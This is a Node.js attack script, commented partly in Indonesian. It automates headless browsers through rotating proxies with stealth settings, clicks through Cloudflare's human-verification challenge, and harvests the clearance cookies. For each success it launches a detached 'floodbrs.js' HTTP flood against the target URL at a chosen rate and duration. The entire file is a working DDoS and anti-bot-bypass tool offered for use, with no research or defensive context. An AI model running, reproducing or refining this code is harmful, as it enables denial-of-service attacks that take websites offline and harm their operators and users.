const fs = require('fs');
const puppeteer = require('puppeteer-extra');
const StealthPlugin = require('puppeteer-extra-plugin-stealth');
const UserAgent = require('user-agents');
const { spawn } = require('child_process');

puppeteer.use(StealthPlugin());

// Command-line arguments
const targetURL = process.argv[2];
const threads = parseInt(process.argv[3]);
const proxyFile = process.argv[4];
const rate = process.argv[5];
const duration = parseInt(process.argv[6]);

console.log(`[ START ] Cloudflare Bypass Started`);
console.log(`[ TARGET ] ${targetURL}`);

// Read proxies
const readProxies = (filePath) => {
    try {
        const proxies = fs.readFileSync(filePath, 'utf8').trim().split(/\r?\n/).filter(Boolean);
        console.log(`[ PROXY ] Loaded ${proxies.length} proxies`);
        return proxies.map(proxy => proxy.replace(/https?:\/\//, '').trim());
    } catch (error) {
        console.log(`[ ERROR ] Proxy file: ${error.message}`);
        return [];
    }
};

// Generate user agent
const generateUserAgent = () => {
    const userAgent = new UserAgent({ deviceCategory: 'desktop' });
    return userAgent.toString();
};

// Wait functions
const sleep = (ms) => new Promise(resolve => setTimeout(resolve, ms));

// Cloudflare bypass dengan waiting untuk "Verifying..."
const cloudflareBypass = async (page) => {
    try {
        console.log(`[ BYPASS ] Waiting for Cloudflare challenge...`);
        
        // Tunggu halaman load sepenuhnya
        await page.waitForFunction(() => document.readyState === 'complete', { timeout: 30000 });
        
        // Cek status awal
        const initialTitle = await page.title();
        const initialUrl = await page.url();
        console.log(`[ BYPASS ] Initial - Title: "${initialTitle}", URL: ${initialUrl}`);

        // TAHAP 1: Tunggu proses "Verifying..." selesai
        console.log(`[ BYPASS ] ⏳ Waiting for "Verifying..." to complete...`);
        
        let verifyingCompleted = false;
        let attempts = 0;
        const maxAttempts = 30; // Maksimal 30 detik waiting

        while (attempts < maxAttempts && !verifyingCompleted) {
            await sleep(1000);
            attempts++;
            
            try {
                const currentTitle = await page.title();
                const currentUrl = await page.url();
                
                // Cek tanda-tanda "Verifying..." selesai:
                // 1. Title berubah dari "Just a moment" atau "Checking"
                // 2. URL berubah
                // 3. Ada elemen challenge yang muncul
                
                const isVerifying = 
                    currentTitle.includes('Just a moment') ||
                    currentTitle.includes('Checking your browser') ||
                    currentTitle.includes('Verifying') ||
                    currentUrl.includes('challenge');
                
                if (!isVerifying) {
                    console.log(`[ BYPASS ] ✅ "Verifying" completed after ${attempts}s`);
                    verifyingCompleted = true;
                    break;
                }
                
                // Cek jika sudah ada elemen challenge yang muncul
                const challengeElements = await page.$$([
                    'input[type="checkbox"]',
                    '.hcaptcha-box', 
                    '[role="checkbox"]',
                    '.cf-checkbox',
                    '#challenge-stage input',
                    'input[name="cf_captcha_kind"]',
                    'label[for="cf-challenge-checkbox"]'
                ].join(','));
                
                if (challengeElements.length > 0) {
                    console.log(`[ BYPASS ] ✅ Challenge elements appeared after ${attempts}s`);
                    verifyingCompleted = true;
                    break;
                }
                
                if (attempts % 5 === 0) {
                    console.log(`[ BYPASS ] Still verifying... (${attempts}s)`);
                }
                
            } catch (e) {
                // Continue waiting
            }
        }

        if (!verifyingCompleted) {
            console.log(`[ BYPASS ] ❌ "Verifying" timed out after ${maxAttempts}s`);
        }

        // TAHAP 2: Handle challenge setelah "Verifying" selesai
        console.log(`[ BYPASS ] 🔍 Looking for challenge elements...`);
        await sleep(3000);

        // Priority selectors untuk challenge Cloudflare
        const challengeSelectors = [
            'input[type="checkbox"]',
            '.hcaptcha-box',
            '[role="checkbox"]',
            '.cf-checkbox',
            '#challenge-stage input',
            'input[name="cf_captcha_kind"]',
            'label[for="cf-challenge-checkbox"]'
        ];

        let challengeSolved = false;

        // Coba setiap selector
        for (const selector of challengeSelectors) {
            try {
                const elements = await page.$$(selector);
                console.log(`[ BYPASS ] Found ${elements.length} elements for: ${selector}`);
                
                for (const element of elements) {
                    try {
                        const isVisible = await page.evaluate(el => {
                            const rect = el.getBoundingClientRect();
                            const style = window.getComputedStyle(el);
                            return rect.width > 0 && 
                                   rect.height > 0 && 
                                   style.visibility !== 'hidden' && 
                                   style.display !== 'none' &&
                                   style.opacity !== '0';
                        }, element);

                        if (isVisible) {
                            console.log(`[ BYPASS ] 🎯 Clicking visible challenge: ${selector}`);
                            
                            // Scroll ke element
                            await page.evaluate(el => {
                                el.scrollIntoView({ behavior: 'smooth', block: 'center' });
                            }, element);
                            
                            await sleep(2000);
                            
                            // Click element
                            await element.click({ delay: 100 });
                            console.log(`[ BYPASS ] ✅ Successfully clicked challenge`);
                            
                            challengeSolved = true;
                            await sleep(8000); // Tunggu setelah click
                            break;
                        }
                    } catch (clickError) {
                        console.log(`[ BYPASS ] Click failed: ${clickError.message}`);
                    }
                }
                if (challengeSolved) break;
            } catch (selectorError) {
                continue;
            }
        }

        // Jika belum solved, coba click tombol verify
        if (!challengeSolved) {
            console.log(`[ BYPASS ] 🔍 Looking for verify buttons...`);
            
            const buttonSelectors = [
                'button[type="submit"]',
                'input[type="submit"]',
                '.button',
                '.btn',
                '.verify-you-are-human',
                '[value="Verify"]',
                '[value="Submit"]'
            ];

            for (const selector of buttonSelectors) {
                try {
                    const elements = await page.$$(selector);
                    for (const element of elements) {
                        try {
                            const isVisible = await page.evaluate(el => {
                                const rect = el.getBoundingClientRect();
                                return rect.width > 0 && rect.height > 0;
                            }, element);

                            if (isVisible) {
                                console.log(`[ BYPASS ] 🎯 Clicking button: ${selector}`);
                                await element.click({ delay: 100 });
                                console.log(`[ BYPASS ] ✅ Button clicked`);
                                challengeSolved = true;
                                await sleep(8000);
                                break;
                            }
                        } catch (e) {
                            continue;
                        }
                    }
                    if (challengeSolved) break;
                } catch (e) {
                    continue;
                }
            }
        }

        // Final check - tunggu proses completion
        console.log(`[ BYPASS ] ⏳ Waiting for final verification...`);
        await sleep(10000);

        const finalTitle = await page.title();
        const finalUrl = await page.url();
        
        console.log(`[ BYPASS ] Final - Title: "${finalTitle}", URL: ${finalUrl}`);

        const isSuccess = !finalTitle.includes('Just a moment') && 
                         !finalTitle.includes('Checking your browser') &&
                         !finalTitle.includes('Verifying') &&
                         !finalUrl.includes('challenge');

        if (isSuccess) {
            console.log(`[ BYPASS ] 🎉 Challenge SOLVED successfully!`);
            return { success: true };
        } else {
            console.log(`[ BYPASS ] ❌ Challenge may not be solved`);
            return { success: false };
        }

    } catch (error) {
        console.log(`[ BYPASS ] 💥 Error: ${error.message}`);
        return { success: false };
    }
};

// Process browser
const processBrowser = async (proxy, index) => {
    let browser;
    try {
        const userAgent = generateUserAgent();
        
        console.log(`\n[ THREAD ${index} ] 🚀 Starting with proxy: ${proxy}`);
        
        const args = [
            '--no-sandbox',
            '--disable-setuid-sandbox',
            '--disable-dev-shm-usage',
            '--disable-gpu',
            '--no-first-run',
            '--ignore-certificate-errors',
            '--ignore-ssl-errors',
            '--disable-web-security',
            '--disable-blink-features=AutomationControlled',
            '--window-size=1280,720',
            `--user-agent=${userAgent}`,
            `--proxy-server=http://${proxy}`
        ];

        browser = await puppeteer.launch({
            headless: true,
            args: args,
            ignoreHTTPSErrors: true,
            timeout: 60000
        });

        const page = await browser.newPage();
        await page.setViewport({ width: 1280, height: 720 });

        // Stealth
        await page.evaluateOnNewDocument(() => {
            Object.defineProperty(navigator, 'webdriver', { get: () => false });
        });

        console.log(`[ THREAD ${index} ] 🌐 Navigating to target...`);
        
        try {
            await page.goto(targetURL, { 
                waitUntil: 'domcontentloaded',
                timeout: 45000
            });
        } catch (navError) {
            console.log(`[ THREAD ${index} ] ⚠️ Navigation warning: ${navError.message}`);
        }

        // Check if page loaded
        const currentUrl = await page.url();
        if (currentUrl.startsWith('chrome-error://')) {
            console.log(`[ THREAD ${index} ] ❌ Page failed to load`);
            await browser.close();
            return { success: false };
        }

        console.log(`[ THREAD ${index} ] ✅ Page loaded: ${currentUrl}`);

        // Execute bypass
        const bypassResult = await cloudflareBypass(page);
        
        if (!bypassResult.success) {
            console.log(`[ THREAD ${index} ] ❌ Bypass failed`);
            await browser.close();
            return { success: false };
        }

        // Get cookies
        const title = await page.title();
        const cookies = await page.cookies();
        
        const cfCookies = cookies.filter(cookie => 
            cookie.name.includes('cf_') || 
            cookie.name.includes('_cf') ||
            cookie.name === 'cf_clearance' ||
            cookie.name === '__cf_bm'
        );

        console.log(`[ THREAD ${index} ] Found ${cfCookies.length} Cloudflare cookies`);
        
        if (cfCookies.length === 0) {
            console.log(`[ THREAD ${index} ] ❌ No Cloudflare cookies found`);
            await browser.close();
            return { success: false };
        }

        const cookieString = cfCookies.map(cookie => `${cookie.name}=${cookie.value}`).join('; ');
        
        await browser.close();

        // SUCCESS
        console.log(`\n[ SUCCESS ] Total Solve : ${index} | Title : ${title} | proxy : ${proxy} | useragent : ${userAgent} | cookies : ${cookieString} |`);
        console.log(`[ SPAWN ] Flood with cookies : ${cookieString} : useragent : ${userAgent}`);

        // Start flood
        try {
            const floodProcess = spawn('node', [
                'floodbrs.js',
                targetURL,
                duration.toString(),
                rate,
                '1',
                proxyFile,
                cookieString,
                userAgent,
                'cf-cookie'
            ], { detached: true, stdio: 'ignore' });
            
            floodProcess.unref();
            console.log(`[ THREAD ${index} ] ✅ Flood process started`);
        } catch (spawnError) {
            console.log(`[ THREAD ${index} ] ❌ Flood error: ${spawnError.message}`);
        }

        return { success: true };
        
    } catch (error) {
        console.log(`[ THREAD ${index} ] 💥 Critical error: ${error.message}`);
        if (browser) await browser.close();
        return { success: false };
    }
};

// Main execution
const main = async () => {
    const proxies = readProxies(proxyFile);
    if (proxies.length === 0) {
        console.log(`[ ERROR ] No proxies available`);
        return;
    }

    console.log(`[ INFO ] Using first ${threads} proxies`);
    
    let successCount = 0;
    let failCount = 0;

    for (let i = 0; i < Math.min(proxies.length, threads); i++) {
        const result = await processBrowser(proxies[i], i + 1);
        
        if (result.success) {
            successCount++;
        } else {
            failCount++;
        }

        console.log(`[ STATS ] ✅ Success: ${successCount} | ❌ Failed: ${failCount}`);
        
        // Delay antara threads
        if (i < Math.min(proxies.length, threads) - 1) {
            const delay = 10000;
            console.log(`[ WAIT ] Pausing for ${delay/1000}s...`);
            await sleep(delay);
        }
    }

    console.log(`\n[ FINAL ] 🏁 Completed! Success: ${successCount}, Failed: ${failCount}`);
    console.log(`[ INFO ] ⏳ Waiting ${duration}s for floods...`);
    await sleep(duration * 1000);
    console.log(`[ END ] ✅ All processes finished`);
};

// Error handling
process.on('SIGINT', () => {
    console.log(`\n[ INFO ] Process interrupted`);
    process.exit(0);
});

process.on('uncaughtException', (error) => {
    console.log(`[ UNCAUGHT ] ${error.message}`);
});

process.on('unhandledRejection', (error) => {
    console.log(`[ REJECTION ] ${error.message}`);
});

// Start
main().catch(error => {
    console.log(`[ MAIN ERROR ] ${error.message}`);
    process.exit(1);
});
